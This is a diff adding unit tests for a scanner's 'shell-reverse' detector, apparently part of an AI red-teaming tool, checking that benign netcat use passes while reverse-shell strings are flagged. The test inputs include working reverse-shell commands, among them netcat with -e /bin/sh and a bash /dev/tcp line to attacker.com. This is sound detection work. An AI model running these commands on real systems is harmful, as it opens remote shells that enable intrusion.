@@ -156,3 +156,27 @@ describe('riskLevel computation', () => {
     expect(r.riskLevel).toBe('safe')
   })
 })
+
+// ─── shell-reverse nc flag tightening (deepteam#225) ──────────────────────
+
+describe('shell-reverse — nc flag precision', () => {
+  const fires = (t: string) =>
+    scanOutput(t).threats.some((x) => x.id === 'shell-reverse')
+
+  it('does NOT flag benign verbose/port netcat usage', () => {
+    expect(fires('nc -v google.com 80')).toBe(false)
+    expect(fires('Use nc -nv host 443 to test connectivity.')).toBe(false)
+    expect(fires('nc -p 8080 example.com')).toBe(false)
+  })
+
+  it('still flags execute/listen reverse-shell netcat', () => {
+    expect(fires('nc -e /bin/sh 10.0.0.1 4444')).toBe(true)
+    expect(fires('nc -lvp 4444 -e /bin/bash')).toBe(true)
+    expect(fires('nc -l -p 4444')).toBe(true)
+  })
+
+  it('still flags non-netcat reverse shells (regression)', () => {
+    expect(fires('bash -i >& /dev/tcp/attacker.com/4444 0>&1')).toBe(true)
+    expect(fires("python3 -c 'import socket'")).toBe(true)
+  })
+})
